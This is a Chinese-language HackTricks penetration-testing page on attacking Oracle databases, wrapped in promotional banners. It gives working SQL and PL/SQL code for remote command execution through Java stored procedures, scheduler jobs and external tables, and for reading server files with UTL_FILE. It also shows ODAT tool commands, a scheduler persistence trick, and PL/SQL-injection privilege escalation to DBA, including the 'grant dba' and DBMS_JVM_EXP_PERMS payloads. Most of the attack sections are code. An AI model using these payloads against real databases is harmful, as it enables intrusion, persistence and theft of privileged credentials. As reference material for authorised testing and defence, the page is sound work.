<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**上关注我。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


# RCE: Java存储过程

假设你有管理员账户信息。在这种情况下，一个非常流行的在服务器上执行命令的方法是编写一个‘java存储’过程。这分为三个阶段完成。首先，创建一个名为‘oraexec’的Java类。为此，通过‘sqlplus’终端连接并编写：
```text
create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
public class oraexec
{
public static void execCommand(String command) throws IOException
{
Runtime.getRuntime().exec(command);
}
}
/

```
接下来，为这个类编写一个PL/SQL包装器：
```text
create or replace procedure javacmd(p_command varchar2) as language java name 'oraexec.execCommand(java.lang.String)'; /
```
这就是全部了。现在，要执行一个命令，你只需要发送以下查询：
```text
exec javacmd('command');
```
请注意，在使用上述程序时，我们无法看到执行命令的结果，但是，您可以将输出重定向到文件并读取它。您可以找到允许读写文件的 shell 的完整代码：

{% file src="../../.gitbook/assets/raptor_oraexec.sql" %}

然而，有一个[更复杂的脚本](goo.gl/EuwPRU)，它可以处理命令输出，但它的大小更大，[在这里](https://oracle-base.com/articles/8i/shell-commands-from-plsql)。

# RCE：调度器

下一个方法，如果没有 Java 虚拟机，可以帮助我们的是使用 `dbmsscheduler`，Oracle 的内置任务调度器。要使用它，您必须拥有 `CREATE EXTERNAL JOB` 权限。以下是一个代码示例，它实现了将字符串 `0wned` 输入到 C: 驱动器根目录中的文本文件：
```text
exec DBMS_SCHEDULER.create_program('RDS2008','EXECUTABLE','c:\ WINDOWS\system32\cmd.exe /c echo 0wned &gt;&gt; c:\rds3.txt',0,TRUE);
exec DBMS_SCHEDULER.create_job(job_name =&gt; 'RDS2008JOB',program_name =&gt; 'RDS2008',start_date =&gt; NULL,repeat_interval =&gt; NULL,end_date =&gt; NULL,enabled =&gt; TRUE,auto_drop =&gt; TRUE);
```
这将创建并运行一个作业来执行您的命令。这里有一个选项，用于从另一个过程调用调度程序 - `SYS.KUPP$PROC.CREATE_MASTER_PROCESS`，这对我们来说主要是因为它允许您嵌入多语句查询，即由多个子查询组成的查询。理论上，即使在注入到Web应用程序的情况下，您也可以运行此类查询。
```text
select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''xxx'',''EXECUTABLE'',''cmd.exe /c echo qqq&gt;&gt;C:/scchh'',0,TRUE); DBMS_SCHEDULER.create_job(job_name=&gt;''jobx'',program_name=&gt;''xxx'',start_date=&gt;NULL,repeat_interval=&gt;NULL,end_date=&gt;NULL,enabled=&gt;TRUE,auto_drop=&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&gt;''xxx'');dbms_scheduler.purge_log;') from dual
```
请注意，当您使用Scheduler时，您可以多次运行此作业，并且可以以一定频率执行。因此，这将帮助您在测试系统中获得立足点，因为即使管理员从操作系统中删除了用户，这个定期在系统中运行的作业也会将他或她重新带回来。

# RCE：外部表

作为实现操作系统命令执行的最后一种方法，我想提到使用外部表。这种方法将帮助您稍后从服务器下载文件。您将需要以下权限：

* UTL\_FILE;
* CREATE TABLE;
* 为用户保留的目录。

让我们记住，默认情况下，所有具有‘CONNECT’角色的账户都提供对‘UTL\_FILE’包的访问。第一步：使用以下查询检查已发出的目录：
```text
SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE TABLE_NAME IN
(SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='DIRECTORY')
and privilege='EXECUTE' ORDER BY GRANTEE;

TABLE_NAME
------------------------------
ALICE_DIR
```
步骤二：创建一个包含所需命令的可执行批处理文件：
```text
declare
f utl_file.file_type;
s varchar2(200) := 'echo KOKOKO &gt;&gt; C:/pwned';
begin
f := utl_file.fopen('ALICE_DIR','test.bat','W');
utl_file.put_line(f,s);
utl_file.fclose(f);
end;
/
```
步骤三：准备外部表‘EXTT’，您将需要它来运行文件：
```text
CREATE TABLE EXTT (line varchar2(256))
ORGANIZATION EXTERNAL
(TYPE oracle_loader
DEFAULT DIRECTORY ALICE_DIR
ACCESS PARAMETERS
( RECORDS DELIMITED BY NEWLINE
FIELDS TERMINATED BY ',')
LOCATION (alice_dir:'test.bat'))
/
```
现在，使用以下命令调用你的批处理文件：
```text
SELECT * from EXTT;
```
终端将开始显示错误消息，系统无法匹配表格和调用的文件，但在这种情况下，这并不重要，因为主要目标是打开可执行文件，而这一目标已经达成。

‘ODAT.py’ 工具也可以实施这种攻击。然而，它需要 ‘CREATE ANY DIRECTORY’ 权限，该权限默认只授予 DBA 角色，因为它尝试从任何目录而不仅仅是“你的”目录执行文件。

# 读/写文件

现在，让我们继续进行读写文件的任务。如果你只是需要读取或写入服务器的文件，你可以在没有任何 Java 程序的情况下完成，尽管 Java 程序也可以处理此类任务。让我们看看 ‘UTL_FILE’ 包，它具有处理文件系统所需的功能。好消息是，默认情况下，所有具有 ‘PUBLIC’ 角色的用户都可以访问它。坏消息是，默认情况下，此过程无法访问整个文件系统，而只能访问管理员预定义的目录。然而，发现目录参数被指定为 ‘*’ 并不罕见，这实际上意味着“访问一切”。你可以使用以下命令来查明这一点：
```text
select name, value from v$parameter where name = 'utl_file_dir';
With appropriate rights, you can expand the access by using the following query:
alter system set utl_file_dir='*' scope =spfile;
```
我发现使用 `UTL_FILE` 包的最简短程序是由 Alexander Polyakov 提出的：
```text
SET SERVEROUTPUT ON
declare
f utl_file.file_type;
sBuffer Varchar(8000);
begin
f:=UTL_FILE.FOPEN (''C:/’,'boot.ini','r');
loop
UTL_FILE.GET_LINE (f,sBuffer);
DBMS_OUTPUT.PUT_LINE(sBuffer);
end loop;
EXCEPTION
when no_data_found then
UTL_FILE.FCLOSE(f);
end;
/

```
如果您需要更多具有写入能力的功能，我建议谷歌一个名为‘raptor\_oraexec.sql’的脚本。按照传统，这里有一个使用‘ODAT’工具的选项，它一如既往地简洁：
```text
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
```
`UTL_FILE` 包也非常有趣，因为如果你运气好，你可以访问日志、配置文件，并从如 `SYS` 这样的特权账户获取密码。

我想提到的第二种方法是再次使用 `External Tables`。记住，使用 `External Tables` 时，数据库可以以读模式访问外部表的数据。对于黑客来说，这意味着又一个从服务器下载文件的机会，但这种方法需要 `CREATE ANY DIRECTORY` 权限。我建议立即使用 `ODAT`，因为它稳定且快速：
```text
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
# 提升权限

您可以使用各种方法来提升权限，从经典的缓冲区溢出和DLL补丁，到针对数据库的专门攻击，如PL/SQL注入。这个主题非常广泛，在本文中，我不会详细讨论，因为这在大型研究论文中已有讨论，例如\[Lichfield\]（goo.gl/IebQN4）和\[Finnigan\]（goo.gl/vXhttf）的博客中。我只是演示其中一些，以便您有一个大致的了解。在测试期间，我建议简单地关注当前权限，并基于此，在互联网上搜索所需的漏洞。

与MS SQL不同，在那里攻击者可以在‘SELECT’之后几乎立即注入‘xp\_cmdshell’，只需用引号关闭它，Oracle DB坚决拒绝这样的技巧。因此，我们不能每次都依赖经典的SQL注入，尽管在这种情况下，也有可能找到解决办法。我们将考虑PL/SQL注入，它通过将随机命令嵌入到可用的输入参数中，修改执行过程（函数、触发器和其他对象）。\(с\) Sh2kerr

为了嵌入有效载荷，找到一个输入参数未经过滤的函数。请记住，Oracle SQL不允许多语句（多个）查询，因此，您可能需要使用一些具有此功能的“特殊”过程。攻击背后的主要思想如下：默认情况下，除非另有说明，过程是代表所有者执行的，而不是代表启动它的用户。换句话说，如果一个由‘SYS’账户拥有的过程可供执行，并且您可以将代码嵌入其中，您的有效载荷也将在‘SYS’账户的上下文中执行。正如我已经提到的，这并不总是发生，因为有些过程带有‘authid current\_user’参数，这意味着该过程将以当前用户的权限执行。然而，通常在每个版本中，您都可以找到一些容易受到PL/SQL注入攻击的函数。这个过程的一般视图如图2所示。

[![inject](https://hackmag.com/wp-content/uploads/2015/04/inject.png)](https://hackmag.com/wp-content/uploads/2015/04/inject.png)

简而言之，我们传递的是恶意代码，而不是预期的合法参数，这些代码成为过程的一部分。一个很好的例子是‘CTXSYS.DRILOAD’函数。它代表‘CTXSYS’执行，并且不过滤输入参数，这使您可以轻松地提升到DBA：
```text
exec ctxsys.driload.validate_stmt('grant dba to scott');
```
```markdown
然而，到目前为止，这可能已经是历史，因为这个漏洞是在2004年发现的，它只影响8-9的旧版本。通常，提升权限的过程分为两部分：编写提升权限的过程和执行注入本身。一个典型的过程如下：
```
```text
CREATE OR REPLACE FUNCTION F1
RETURN NUMBER AUTHID CURRENT_USER
IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
COMMIT;RETURN(1);END;
/
```
现在我们可以将一个过程作为易受攻击函数的参数注入（适用于10x版本的示例）：
```text
exec sys.kupw$WORKER.main('x','YY'' and 1=test1.f1 –-');
```
在不太久前的版本10和11中，有一个“不错”的例外，或者说是一个漏洞，它允许你在没有DBA权限的情况下在服务器上执行命令：‘DBMS\_JVM\_EXP\_PERMS’过程允许具有‘CREATE SESSION’权限的用户获得‘JAVA IO’权限。攻击可以按以下方式进行：
```text
SQL&gt; DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT
'GRANT','GREMLIN','SYS','java.io.FilePermission','&lt;FILES&gt;&gt;','execute','ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/

PL/SQL procedure successfully completed.
```
既然您拥有调用Java程序的权限，您可以引发Windows解释器的响应并执行以下操作：
```text
SQL&gt; select dbms_java.runjava(‘oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c echo 123 &gt;c:\\hack’)from dual;
```
<details>

<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
